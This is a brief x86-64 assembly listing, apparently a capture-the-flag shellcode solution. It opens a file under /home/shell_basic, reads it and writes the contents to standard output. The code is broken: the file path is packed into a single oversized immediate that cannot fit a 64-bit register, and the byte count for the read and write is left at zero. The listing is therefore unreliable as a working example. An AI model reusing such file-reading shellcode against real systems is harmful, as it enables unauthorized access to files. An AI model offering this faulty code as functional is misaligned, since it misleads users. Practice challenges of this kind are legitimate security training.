section .text
global _start
_start:
push 0x67
mov rax, 0x2f686f6d652f7368656c6c5f62617369632f666c61675f6e616d655f69735f6c6f6f6f6f6f6f6e67
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall
mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rax, 0x0
syscall
mov rdi, 1
mov rax, 0x1
syscall
xor rdi, rdi
mov rax, 0x3c
syscall
